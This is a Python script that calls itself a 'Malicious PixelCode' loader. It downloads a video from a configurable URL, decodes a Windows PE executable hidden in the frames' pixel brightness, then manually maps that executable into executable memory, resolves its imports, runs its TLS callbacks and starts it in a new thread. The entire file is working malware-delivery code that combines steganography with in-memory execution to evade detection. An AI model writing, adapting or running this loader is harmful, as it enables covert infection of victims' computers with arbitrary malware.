#!/usr/bin/env python3
"""
Malicious PixelCode - Complete Python Loader (Fixed for 32-bit)
Downloads video, extracts hidden PE, and executes it in memory.
"""

import cv2
import numpy as np
from PIL import Image
import ctypes
import sys
import os
import tempfile
import requests
from tqdm import tqdm
import pefile

# ===================== CONFIGURATION =====================
# Hardcode your video URL here (direct link to the PixelCode video)
VIDEO_URL = "https://example.com/pixelcode_video.mp4"   # <-- REPLACE WITH YOUR URL

# Pixel decoding parameters (must match the encoder)
PIXEL_SIZE           = 4
WHITE_IS_ZERO        = True
BRIGHTNESS_THRESHOLD = 180

# Execution control
EXECUTE_PAYLOAD      = True   # Set to False to only map (debug)
SAVE_PAYLOAD         = False  # Save extracted PE to disk for analysis
# ==========================================================

def download_video(url):
    """Download video from URL to a temporary file."""
    print(f"[*] Downloading from: {url}")
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        total_size = int(response.headers.get('content-length', 0))

        fd, temp_path = tempfile.mkstemp(suffix='.mp4')
        os.close(fd)

        with open(temp_path, 'wb') as f:
            with tqdm(total=total_size, unit='B', unit_scale=True, desc="Downloading") as pbar:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
                    pbar.update(len(chunk))

        print(f"[+] Video downloaded to temporary file: {temp_path}")
        return temp_path
    except Exception as e:
        print(f"[!] Download failed: {e}")
        return None

def extract_payload(video_path):
    """Extract hidden PE from video using pixel decoding."""
    if not os.path.isfile(video_path):
        print(f"[!] Video file not found: {video_path}")
        return None

    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        print("[!] Cannot open video")
        return None

    w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    fc = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
    print(f"[i] Video: {w}×{h}   {fc} frames")

    cols = w // PIXEL_SIZE
    rows = h // PIXEL_SIZE
    bits = []

    with tqdm(total=fc, desc="Reading frames", unit="frame") as pbar:
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)

            for r in range(rows):
                for c in range(cols):
                    cx = c * PIXEL_SIZE + PIXEL_SIZE // 2
                    cy = r * PIXEL_SIZE + PIXEL_SIZE // 2
                    if cx >= w or cy >= h:
                        continue
                    rv, gv, bv = img.getpixel((cx, cy))
                    bright = (rv + gv + bv) // 3
                    # Determine bit based on brightness
                    if WHITE_IS_ZERO:
                        bit = 0 if bright > BRIGHTNESS_THRESHOLD else 1
                    else:
                        bit = 1 if bright > BRIGHTNESS_THRESHOLD else 0
                    bits.append(bit)
            pbar.update(1)
    cap.release()

    if not bits:
        print("[!] No bits extracted")
        return None

    print(f"[i] Collected {len(bits):,} bits")
    # Convert bits to bytes
    payload = bytearray()
    for i in range(0, len(bits) - len(bits) % 8, 8):
        b = 0
        for j in range(8):
            b = (b << 1) | bits[i + j]
        payload.append(b)
    print(f"[+] Reconstructed payload: {len(payload):,} bytes")
    return bytes(payload)

def map_and_run_pe(raw_pe: bytes, execute_thread=True, save_payload=False):
    """Manually map PE into memory and execute (supports 32/64-bit)."""
    if sys.platform != "win32":
        print("[!] This code requires Windows")
        return

    if save_payload:
        with open("extracted_payload.exe", "wb") as f:
            f.write(raw_pe)
        print(f"[+] Payload saved to extracted_payload.exe")

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

    # Function prototypes
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    kernel32.VirtualProtect.restype = ctypes.c_bool
    kernel32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    kernel32.LoadLibraryA.restype = ctypes.c_void_p
    kernel32.LoadLibraryA.argtypes = [ctypes.c_char_p]
    kernel32.GetProcAddress.restype = ctypes.c_void_p
    kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    kernel32.CreateThread.restype = ctypes.c_void_p
    kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p,
                                      ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    kernel32.WaitForSingleObject.restype = ctypes.c_ulong
    kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
    kernel32.VirtualFree.restype = ctypes.c_int
    kernel32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]

    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READ = 0x20
    PAGE_READONLY = 0x02
    MEM_RELEASE = 0x8000

    try:
        pe = pefile.PE(data=raw_pe)
    except Exception as e:
        print(f"[!] PE parsing failed: {e}")
        return

    is_64bit = pe.FILE_HEADER.Machine == 0x8664  # IMAGE_FILE_MACHINE_AMD64
    print(f"[i] PE architecture: {'64-bit' if is_64bit else '32-bit'}")

    image_base = pe.OPTIONAL_HEADER.ImageBase
    image_size = pe.OPTIONAL_HEADER.SizeOfImage
    print(f"[i] ImageBase: 0x{image_base:X}   SizeOfImage: {image_size:,}")

    # Allocate memory with RWX
    base_addr = kernel32.VirtualAlloc(None, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not base_addr:
        print(f"[!] VirtualAlloc failed (err {ctypes.get_last_error()})")
        return
    print(f"[+] Allocated at 0x{base_addr:X}")

    # Copy PE headers
    ctypes.memmove(base_addr, raw_pe, pe.OPTIONAL_HEADER.SizeOfHeaders)

    # Copy sections
    for sec in pe.sections:
        dest = base_addr + sec.VirtualAddress
        src_data = raw_pe[sec.PointerToRawData : sec.PointerToRawData + sec.SizeOfRawData]
        ctypes.memmove(dest, src_data, len(src_data))

    # Relocations
    delta = base_addr - image_base
    if delta != 0:
        print("[i] Relocating image")
        reloc_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_BASERELOC']]
        if reloc_dir.Size:
            offset = 0
            data = pe.get_data(reloc_dir.VirtualAddress, reloc_dir.Size)
            while offset < len(data):
                block_rva = int.from_bytes(data[offset:offset+4], "little")
                block_size = int.from_bytes(data[offset+4:offset+8], "little")
                offset += 8
                if block_rva == 0:
                    break
                for i in range(0, block_size - 8, 2):
                    entry = int.from_bytes(data[offset:offset+2], "little")
                    offset += 2
                    rtype = entry >> 12
                    roff = entry & 0xFFF
                    addr = base_addr + block_rva + roff

                    if rtype == 10:  # IMAGE_REL_BASED_DIR64 (64-bit)
                        if is_64bit:
                            val = int.from_bytes(ctypes.string_at(addr, 8), "little") + delta
                            ctypes.memmove(addr, val.to_bytes(8, "little"), 8)
                    elif rtype == 3:  # IMAGE_REL_BASED_HIGHLOW (32-bit)
                        if not is_64bit:
                            val = int.from_bytes(ctypes.string_at(addr, 4), "little") + delta
                            ctypes.memmove(addr, val.to_bytes(4, "little"), 4)

    # Imports
    print("[i] Resolving imports")
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            dll_name = entry.dll.decode('utf-8') if isinstance(entry.dll, bytes) else entry.dll
            dll = kernel32.LoadLibraryA(dll_name.encode('utf-8'))
            if not dll:
                print(f"[!] LoadLibraryA failed for {dll_name}")
                kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
                return
            for imp in entry.imports:
                if imp.name:
                    func_name = imp.name.decode('utf-8') if isinstance(imp.name, bytes) else imp.name
                    func = kernel32.GetProcAddress(dll, func_name.encode('utf-8'))
                    if not func:
                        print(f"[!] GetProcAddress failed: {func_name}")
                        kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
                        return

                    # Write function address with correct size
                    iat_addr = base_addr + imp.address - image_base
                    if is_64bit:
                        ctypes.memmove(iat_addr, ctypes.c_void_p(func).value.to_bytes(8, "little"), 8)
                    else:
                        # 32-bit: truncate to 4 bytes
                        func_addr = ctypes.c_void_p(func).value
                        if func_addr > 0xFFFFFFFF:
                            print(f"[!] Warning: Function address 0x{func_addr:X} too large for 32-bit")
                        ctypes.memmove(iat_addr, (func_addr & 0xFFFFFFFF).to_bytes(4, "little"), 4)

    # TLS callbacks (optional)
    tls_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_TLS']]
    if tls_dir.Size:
        try:
            tls = pe.parse_directory_tls(tls_dir.VirtualAddress)
            if tls and tls.callbacks:
                print(f"[i] Found {len(tls.callbacks)} TLS callbacks")
                for cb_rva in tls.callbacks:
                    cb_addr = base_addr + cb_rva - image_base
                    print(f"  → Calling TLS callback at 0x{cb_addr:X}")
                    try:
                        callback = ctypes.CFUNCTYPE(None)(cb_addr)
                        callback()
                    except Exception as e:
                        print(f"  → TLS callback failed: {e}")
        except Exception as e:
            print(f"[!] Error processing TLS: {e}")

    # Entry point
    entry_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    entry_addr = base_addr + entry_rva
    print(f"[+] Entry point: 0x{entry_addr:X}")

    if not execute_thread:
        print("\n[DEBUG MODE] Thread creation skipped. Mapping completed.")
        print(f"Memory is ready at 0x{base_addr:X} – you may attach debugger now.")
        input("Press Enter to free memory and exit...")
        kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
        return

    # Create thread at entry point
    tid = ctypes.c_ulong(0)
    h_thread = kernel32.CreateThread(None, 0, entry_addr, None, 0, ctypes.byref(tid))
    if not h_thread:
        print(f"[!] CreateThread failed (err {ctypes.get_last_error()})")
        kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
        return

    print(f"[+] Thread started (TID {tid.value}) → waiting...")
    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
    print("[+] Thread finished")

    kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)

def main():
    print("Malicious PixelCode - Fixed Loader")
    print("=" * 60)

    # Download video
    video_path = download_video(VIDEO_URL)
    if not video_path:
        sys.exit(1)

    # Extract payload
    payload = extract_payload(video_path)

    # Delete temporary video
    try:
        os.unlink(video_path)
        print("[+] Temporary video deleted")
    except:
        pass

    if not payload:
        print("[!] Extraction failed")
        sys.exit(1)

    # Map and execute
    print("\n[*] Starting manual mapping...")
    map_and_run_pe(payload, execute_thread=EXECUTE_PAYLOAD, save_payload=SAVE_PAYLOAD)
    print("\n[+] All done.")

if __name__ == "__main__":
    main()
